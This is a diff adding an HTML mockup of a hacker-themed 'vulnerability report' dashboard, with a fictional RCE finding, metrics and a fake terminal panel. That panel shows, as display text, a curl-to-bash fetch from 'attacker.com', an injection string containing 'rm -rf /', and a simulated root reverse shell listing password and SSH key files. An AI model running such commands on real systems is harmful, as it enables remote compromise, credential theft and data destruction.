@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>OBSIDIAN_VEIL // VULNERABILITY_REPORT</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&amp;family=Inter:wght@300;400;500;600;700&amp;family=JetBrains+Mono:wght@400;700&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    colors: {
+                        "tertiary-container": "#ff4e7a",
+                        "inverse-surface": "#e5e2e1",
+                        "surface-container-lowest": "#0e0e0e",
+                        "surface-container-high": "#2a2a2a",
+                        "surface-bright": "#3a3939",
+                        "on-primary-container": "#5b000f",
+                        "on-secondary": "#313030",
+                        "primary-fixed-dim": "#ffb3b2",
+                        "surface-dim": "#131313",
+                        "secondary-fixed": "#e5e2e1",
+                        "on-surface": "#e5e2e1",
+                        "primary": "#ffb3b2",
+                        "surface-container": "#201f1f",
+                        "primary-fixed": "#ffdad8",
+                        "tertiary": "#ffb2bd",
+                        "surface-variant": "#353534",
+                        "tertiary-fixed": "#ffd9dd",
+                        "on-tertiary-container": "#5a001e",
+                        "surface-tint": "#ffb3b2",
+                        "on-secondary-fixed": "#1c1b1b",
+                        "on-secondary-fixed-variant": "#474746",
+                        "error-container": "#93000a",
+                        "on-tertiary-fixed-variant": "#900036",
+                        "background": "#131313",
+                        "outline": "#af8786",
+                        "on-primary-fixed": "#410008",
+                        "inverse-on-surface": "#313030",
+                        "on-surface-variant": "#e9bcba",
+                        "on-background": "#e5e2e1",
+                        "on-error-container": "#ffdad6",
+                        "surface-container-highest": "#353534",
+                        "secondary-container": "#474746",
+                        "on-error": "#690005",
+                        "tertiary-fixed-dim": "#ffb2bd",
+                        "surface": "#131313",
+                        "inverse-primary": "#bf002a",
+                        "secondary-fixed-dim": "#c8c6c5",
+                        "on-tertiary-fixed": "#400013",
+                        "on-primary-fixed-variant": "#92001e",
+                        "surface-container-low": "#1c1b1b",
+                        "secondary": "#c8c6c5",
+                        "on-secondary-container": "#b7b5b4",
+                        "outline-variant": "#5f3e3e",
+                        "primary-container": "#ff525c",
+                        "on-primary": "#680012",
+                        "error": "#ffb4ab",
+                        "on-tertiary": "#670024"
+                    },
+                    fontFamily: {
+                        "headline": ["Space Grotesk"],
+                        "body": ["Inter"],
+                        "label": ["Space Grotesk"],
+                        "mono": ["JetBrains Mono"]
+                    },
+                    borderRadius: {"DEFAULT": "0.125rem", "lg": "0.25rem", "xl": "0.5rem", "full": "0.75rem"},
+                },
+            },
+        }
+    </script>
+<style>
+        .material-symbols-outlined {
+            font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
+        }
+        .glass-panel {
+            background: rgba(28, 27, 27, 0.7);
+            backdrop-filter: blur(20px);
+        }
+        .cyber-grid {
+            background-image: radial-gradient(circle at 2px 2px, rgba(255, 82, 92, 0.05) 1px, transparent 0);
+            background-size: 40px 40px;
+        }
+        .red-glow-spot {
+            background: radial-gradient(circle at 50% 50%, rgba(255, 82, 92, 0.15), transparent 70%);
+        }
+        @keyframes pulse-ring {
+            0% { transform: scale(0.8); opacity: 0.5; }
+            100% { transform: scale(1.5); opacity: 0; }
+        }
+        .threat-pulse {
+            position: relative;
+        }
+        .threat-pulse::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 2px solid #ff525c;
+            border-radius: 50%;
+            animation: pulse-ring 2s infinite;
+        }
+    </style>
+</head>
+<body class="bg-background text-on-surface font-body selection:bg-primary-container selection:text-white overflow-x-hidden">
+<!-- TOP NAVIGATION BAR -->
+<nav class="fixed top-0 w-full z-50 flex justify-between items-center px-6 h-16 w-full bg-[#131313]/70 backdrop-blur-xl shadow-[0_0_20px_rgba(255,82,92,0.08)] border-none">
+<div class="flex items-center gap-8">
+<span class="text-xl font-bold tracking-tighter text-[#FFB3B2] uppercase font-['Space_Grotesk']">OBSIDIAN_VEIL</span>
+<div class="hidden md:flex gap-6 items-center h-full">
+<a class="text-[#FFB3B2] border-b-2 border-[#FF525C] font-['Space_Grotesk'] tracking-tight h-full flex items-center transition-all duration-300" href="#">REPORTS</a>
+<a class="text-[#E9BCBA]/60 font-['Space_Grotesk'] tracking-tight hover:bg-[#353534] px-3 h-full flex items-center transition-all duration-300" href="#">NETWORK</a>
+<a class="text-[#E9BCBA]/60 font-['Space_Grotesk'] tracking-tight hover:bg-[#353534] px-3 h-full flex items-center transition-all duration-300" href="#">ASSETS</a>
+</div>
+</div>
+<div class="flex items-center gap-4">
+<div class="bg-surface-container-lowest border border-outline-variant/10 px-3 py-1.5 flex items-center gap-2">
+<span class="material-symbols-outlined text-primary text-sm">terminal</span>
+<span class="text-[10px] font-mono text-on-surface-variant">SESSION: ACTIVE_0XF4</span>
+</div>
+<div class="flex gap-2">
+<button class="material-symbols-outlined text-on-surface-variant p-2 hover:bg-[#353534] transition-all">notifications_active</button>
+<button class="material-symbols-outlined text-on-surface-variant p-2 hover:bg-[#353534] transition-all">settings_input_component</button>
+</div>
+<img alt="Operator Avatar" class="w-8 h-8 rounded-none border border-primary-container/30 grayscale hover:grayscale-0 transition-all cursor-pointer" data-alt="Cybernetic soldier portrait in dark tones" src="https://lh3.googleusercontent.com/aida-public/AB6AXuBoOLRHIQKGznf3eFRAHMgi9Zamh-yWmsqducWpwGp2y-7eLGMp-DmsD17suwzsLI5gydzMV25GgexbBP4EgV2L72lLq0IHawPbHHBrodf0OHu8aTSqCMsXspFBJZgCjrq46hoUttwURRMnP2ZS9RQkHc-l5iplj01TXIpf90gJGtV1-7wKlq6AAAGjT7X-FGsa3pwdrG5RWdM_Bm_zd27Pmes9hWPWVtsdko9X8VY0RCjIEHOV60OFlDMReb4HKjwNdq22TAo2JSy2"/>
+</div>
+</nav>
+<!-- SIDE NAVIGATION BAR -->
+<aside class="fixed left-0 top-0 h-full w-64 z-40 flex flex-col pt-20 pb-8 px-4 bg-[#1C1B1B] bg-[#201F1F]">
+<div class="mb-8 px-2">
+<div class="flex items-center gap-3 mb-1">
+<div class="w-2 h-2 bg-primary threat-pulse"></div>
+<span class="text-[#FFB3B2] font-black font-['Inter'] uppercase tracking-widest text-[10px]">NODE_01</span>
+</div>
+<span class="text-[#E9BCBA]/40 font-['Inter'] font-medium uppercase tracking-widest text-[10px]">STATUS: OFFENSIVE</span>
+</div>
+<div class="flex flex-col gap-1">
+<div class="flex items-center gap-3 px-4 py-3 bg-[#2A2A2A] text-[#FF525C] border-r-2 border-[#FF525C] shadow-[inset_-10px_0_15px_rgba(255,82,92,0.1)] transition-colors duration-300 cursor-pointer">
+<span class="material-symbols-outlined text-lg">dashboard</span>
+<span class="font-['Inter'] font-medium uppercase tracking-widest text-[10px]">Command</span>
+</div>
+<div class="flex items-center gap-3 px-4 py-3 text-[#E9BCBA]/40 hover:bg-[#2A2A2A] hover:text-[#FFB3B2] transition-colors duration-300 cursor-pointer">
+<span class="material-symbols-outlined text-lg">android_fingerprint</span>
+<span class="font-['Inter'] font-medium uppercase tracking-widest text-[10px]">Infiltrate</span>
+</div>
+<div class="flex items-center gap-3 px-4 py-3 text-[#E9BCBA]/40 hover:bg-[#2A2A2A] hover:text-[#FFB3B2] transition-colors duration-300 cursor-pointer">
+<span class="material-symbols-outlined text-lg">query_stats</span>
+<span class="font-['Inter'] font-medium uppercase tracking-widest text-[10px]">Analyze</span>
+</div>
+<div class="flex items-center gap-3 px-4 py-3 text-[#E9BCBA]/40 hover:bg-[#2A2A2A] hover:text-[#FFB3B2] transition-colors duration-300 cursor-pointer">
+<span class="material-symbols-outlined text-lg">upload_file</span>
+<span class="font-['Inter'] font-medium uppercase tracking-widest text-[10px]">Exfiltrate</span>
+</div>
+<div class="flex items-center gap-3 px-4 py-3 text-[#E9BCBA]/40 hover:bg-[#2A2A2A] hover:text-[#FFB3B2] transition-colors duration-300 cursor-pointer">
+<span class="material-symbols-outlined text-lg">terminal</span>
+<span class="font-['Inter'] font-medium uppercase tracking-widest text-[10px]">Logs</span>
+</div>
+<div class="flex items-center gap-3 px-4 py-3 text-[#E9BCBA]/40 hover:bg-[#2A2A2A] hover:text-[#FFB3B2] transition-colors duration-300 cursor-pointer">
+<span class="material-symbols-outlined text-lg">settings</span>
+<span class="font-['Inter'] font-medium uppercase tracking-widest text-[10px]">Settings</span>
+</div>
+</div>
+<div class="mt-auto px-2">
+<button class="w-full bg-primary-container text-on-primary-container font-black py-3 text-[10px] tracking-[0.2em] hover:shadow-[0_0_20px_rgba(255,82,92,0.4)] transition-all">
+                INITIATE SCAN
+            </button>
+</div>
+</aside>
+<!-- MAIN CONTENT CANVAS -->
+<main class="pl-64 pt-16 min-h-screen cyber-grid">
+<div class="p-8 max-w-7xl mx-auto space-y-8">
+<!-- HEADER SECTION -->
+<header class="relative flex justify-between items-end">
+<div class="space-y-2">
+<div class="flex items-center gap-2 text-primary font-mono text-xs tracking-widest">
+<span class="material-symbols-outlined text-xs">shield_with_heart</span>
+                        REPORT_ID: XR-9921-ALPHA
+                    </div>
+<h1 class="font-headline text-5xl font-bold tracking-tighter text-on-surface uppercase leading-none">
+                        Vulnerability <span class="text-primary-container">Report</span>
+</h1>
+</div>
+<div class="flex gap-4">
+<button class="bg-surface-container-high hover:bg-surface-variant text-on-surface-variant px-6 py-2 border border-outline-variant/20 font-label text-sm transition-all flex items-center gap-2">
+<span class="material-symbols-outlined text-sm">download</span> EXPORT PDF
+                    </button>
+<button class="bg-primary-container text-on-primary-container font-black px-8 py-2 font-label text-sm hover:shadow-[0_0_25px_rgba(255,82,92,0.3)] transition-all flex items-center gap-2 active:scale-95">
+                        PATCH NOW <span class="material-symbols-outlined text-sm">auto_fix_high</span>
+</button>
+</div>
+</header>
+<!-- BENTO GRID LAYOUT -->
+<div class="grid grid-cols-12 gap-6">
+<!-- CRITICAL VULN CARD -->
+<section class="col-span-12 lg:col-span-8 space-y-6">
+<div class="glass-panel border-l-4 border-primary-container p-8 relative overflow-hidden group">
+<div class="absolute top-0 right-0 p-4 opacity-5 pointer-events-none">
+<span class="material-symbols-outlined text-9xl">warning</span>
+</div>
+<div class="flex justify-between items-start mb-6">
+<div class="space-y-1">
+<span class="bg-primary-container/10 text-primary-container px-3 py-1 text-[10px] font-bold tracking-widest border border-primary-container/20">CRITICAL // P0</span>
+<h2 class="text-3xl font-headline font-bold text-white tracking-tight">Remote Code Execution (RCE) via Unsanitized Input</h2>
+</div>
+<div class="text-right">
+<div class="text-5xl font-headline font-extrabold text-primary-container tracking-tighter">9.8</div>
+<div class="text-[10px] font-label text-on-surface-variant uppercase tracking-widest">CVSS SCORE</div>
+</div>
+</div>
+<div class="grid grid-cols-2 gap-8 py-6 border-y border-outline-variant/10">
+<div>
+<h4 class="text-[10px] font-label text-primary-container uppercase tracking-widest mb-2">Impact Analysis</h4>
+<p class="text-on-surface-variant text-sm leading-relaxed">
+                                    Total System Compromise. Attacker gains full kernel-level access to the host node. Sensitive data exfiltration and persistent lateral movement possible within 4.2ms of execution.
+                                </p>
+</div>
+<div>
+<h4 class="text-[10px] font-label text-primary-container uppercase tracking-widest mb-2">Recommendation</h4>
+<p class="text-on-surface-variant text-sm leading-relaxed">
+                                    Immediate Patching Required. Disable unsanitized input vectors on the /v1/api/endpoint. Implement strict input validation and upgrade system core to v4.2.9.
+                                </p>
+</div>
+</div>
+<!-- TERMINAL VIEW -->
+<div class="mt-8 bg-surface-container-lowest border border-outline-variant/20 overflow-hidden font-mono">
+<div class="bg-surface-container-high px-4 py-2 flex items-center justify-between border-b border-outline-variant/20">
+<div class="flex gap-1.5">
+<div class="w-2.5 h-2.5 rounded-full bg-red-500/50"></div>
+<div class="w-2.5 h-2.5 rounded-full bg-yellow-500/50"></div>
+<div class="w-2.5 h-2.5 rounded-full bg-green-500/50"></div>
+</div>
+<div class="text-[10px] text-on-surface-variant/50 tracking-widest">SHELL_ACCESS: ROOT@NODE_01</div>
+</div>
+<div class="p-4 text-xs space-y-1 h-64 overflow-y-auto custom-scrollbar">
+<div class="text-green-400">$ exploit_framework --target 192.168.1.105 --vuln RCE</div>
+<div class="text-on-surface-variant">[+] Initializing payload delivery...</div>
+<div class="text-on-surface-variant">[+] Bypassing WAF layer 7... SUCCESS</div>
+<div class="text-on-surface-variant">[+] Crafting malicious POST request...</div>
+<div class="text-primary-container/80 py-2">
+                                    { "cmd": "curl -s http://attacker.com/payload.sh | bash", "input": "'; rm -rf /; # -- bypass --" }
+                                </div>
+<div class="text-on-surface-variant">[+] Payload executed. Awaiting connection...</div>
+<div class="text-primary-container font-bold text-sm animate-pulse">CONNECT BACK ESTABLISHED [192.168.1.105:4444]</div>
+<div class="text-on-surface-variant"># whoami</div>
+<div class="text-green-400">root</div>
+<div class="text-on-surface-variant"># ls /root/secrets</div>
+<div class="text-on-surface-variant">config.json  db_passwords.txt  ssh_keys.zip</div>
+<div class="text-green-400"># _</div>
+</div>
+</div>
+</div>
+</section>
+<!-- METRICS COLUMN -->
+<aside class="col-span-12 lg:col-span-4 space-y-6">
+<!-- REAL TIME MONITOR -->
+<div class="glass-panel p-6 border border-outline-variant/10 flex flex-col items-center justify-center text-center space-y-4">
+<div class="w-24 h-24 rounded-full border-4 border-primary-container/20 flex items-center justify-center relative">
+<div class="absolute inset-0 border-t-4 border-primary-container rounded-full animate-spin"></div>
+<span class="text-3xl font-headline font-black text-on-surface">P0</span>
+</div>
+<div>
+<div class="text-sm font-label text-on-surface-variant uppercase tracking-widest">Threat Level</div>
+<div class="text-primary-container font-headline text-xl font-bold uppercase">Critical Imminent</div>
+</div>
+</div>
+<!-- DATA STATS -->
+<div class="glass-panel p-6 border border-outline-variant/10 space-y-6">
+<div>
+<div class="flex justify-between items-end mb-1">
+<span class="text-[10px] font-label text-on-surface-variant uppercase tracking-widest">Vulnerabilities Found</span>
+<span class="text-2xl font-headline font-bold text-primary-container">42</span>
+</div>
+<div class="h-1 bg-surface-container-high overflow-hidden">
+<div class="h-full bg-primary-container w-[88%] shadow-[0_0_10px_#ff525c]"></div>
+</div>
+</div>
+<div>
+<div class="flex justify-between items-end mb-1">
+<span class="text-[10px] font-label text-on-surface-variant uppercase tracking-widest">Data Exfiltrated</span>
+<span class="text-2xl font-headline font-bold text-primary-container">2.4 GB</span>
+</div>
+<div class="h-1 bg-surface-container-high overflow-hidden">
+<div class="h-full bg-primary-container w-[65%] shadow-[0_0_10px_#ff525c]"></div>
+</div>
+</div>
+<div>
+<div class="flex justify-between items-end mb-1">
+<span class="text-[10px] font-label text-on-surface-variant uppercase tracking-widest">Access Level</span>
+<span class="text-2xl font-headline font-bold text-primary-container">KERNEL</span>
+</div>
+<div class="h-1 bg-surface-container-high overflow-hidden">
+<div class="h-full bg-primary-container w-[100%] shadow-[0_0_10px_#ff525c]"></div>
+</div>
+</div>
+</div>
+<!-- NETWORK VISUALIZER -->
+<div class="glass-panel p-6 border border-outline-variant/10 relative overflow-hidden h-64">
+<div class="absolute inset-0 red-glow-spot pointer-events-none"></div>
+<h4 class="text-[10px] font-label text-primary-container uppercase tracking-widest mb-4">Traffic Map_ID: 4</h4>
+<div class="relative h-full w-full flex items-center justify-center">
+<div class="absolute w-40 h-40 border border-primary-container/10 rounded-full animate-[pulse_4s_infinite]"></div>
+<div class="absolute w-20 h-20 border border-primary-container/20 rounded-full animate-[pulse_2s_infinite]"></div>
+<div class="grid grid-cols-4 gap-4 w-full h-full p-4 opacity-40">
+<div class="h-4 bg-primary-container/20 w-full animate-pulse"></div>
+<div class="h-8 bg-primary-container/40 w-full"></div>
+<div class="h-12 bg-primary-container/10 w-full animate-pulse delay-75"></div>
+<div class="h-6 bg-primary-container/30 w-full"></div>
+<div class="h-20 bg-primary-container/5 w-full"></div>
+<div class="h-4 bg-primary-container/50 w-full animate-pulse delay-150"></div>
+<div class="h-10 bg-primary-container/20 w-full"></div>
+<div class="h-2 bg-primary-container/40 w-full animate-pulse"></div>
+</div>
+<div class="absolute z-10 text-[10px] font-mono text-primary animate-bounce">INTERCEPTION_POINT</div>
+</div>
+</div>
+</aside>
+</div>
+<!-- ACTION FOOTER SECTION -->
+<footer class="glass-panel p-6 border border-primary-container/20 flex flex-col md:flex-row justify-between items-center gap-6">
+<div class="flex items-center gap-6">
+<div class="flex -space-x-3">
+<img alt="Operator 1" class="w-10 h-10 border-2 border-background rounded-none grayscale" data-alt="Cybersecurity agent icon" src="https://lh3.googleusercontent.com/aida-public/AB6AXuD4aOa7OdjTbmZjwwfiqI4GzsC546KkUPdsQJyJLaY5UGdyPYvgewmQwzzeAVEDAY1sdJfDCrGLQzacfYdCntjOeAem7ejxcqTRXyV07ir4xY2uMuk45EYvEYfGuOPdVXTateS73483MdIa1Y1OlYoSv69ofKmA3cNh5SYPPkmHuwEMJdJZasEOsO1dn5gmNjxroU2kyt0fUVCCZcenprColCafY14PL8xacLlT0wVOlCY4RWP2bJ5NLsD_65U7jhOIelcezWg-AGyS"/>
+<img alt="Operator 2" class="w-10 h-10 border-2 border-background rounded-none grayscale" data-alt="Hacker operative avatar" src="https://lh3.googleusercontent.com/aida-public/AB6AXuBCIubhXKSPXr9oGWbyujQNksjo_hsW6UOpo-jn5-pFP7CefCC3LicIwKjR4ys2O4lWSmtyHn-g-Twpu56i-XWNtEh1cGOe7e9DZCxi6acCwqwBlRQ9iSN6-wU_bMZJ4e8B8n-dhBb1UzJQbH40CFW54JP3u__2UWkIKoFZCLh5M5QP0vV7HWvi9VIFSA6s1zo27C-YVuIWJ-2mrbTZtEp1p1ZPjTPGdRFwLXmlpzPrOpWRvNCyIIgD2TfYSrmxJOPUPpNjZpB9bqch"/>
+<div class="w-10 h-10 bg-surface-container-high border-2 border-background flex items-center justify-center text-[10px] font-black">+4</div>
+</div>
+<div>
+<div class="text-xs font-bold text-on-surface uppercase tracking-widest">Tactical Team Alpha</div>
+<div class="text-[10px] text-on-surface-variant/60 uppercase">4 ACTIVE // 2 STANDBY</div>
+</div>
+</div>
+<div class="flex gap-3">
+<div class="bg-surface-container-lowest border border-outline-variant/10 px-4 py-2 flex items-center gap-4">
+<div class="flex flex-col">
+<span class="text-[8px] text-on-surface-variant uppercase tracking-widest">SCAN DURATION</span>
+<span class="text-sm font-mono text-primary">00:14:22:09</span>
+</div>
+<div class="w-[1px] h-8 bg-outline-variant/20"></div>
+<div class="flex flex-col">
+<span class="text-[8px] text-on-surface-variant uppercase tracking-widest">NETWORK LOAD</span>
+<span class="text-sm font-mono text-primary">42.8 GB/S</span>
+</div>
+</div>
+</div>
+</footer>
+</div>
+</main>
+<!-- FLOATING ACTION BUTTON (SUPPRESSED AS PER TASK FOCUS) -->
+</body></html>
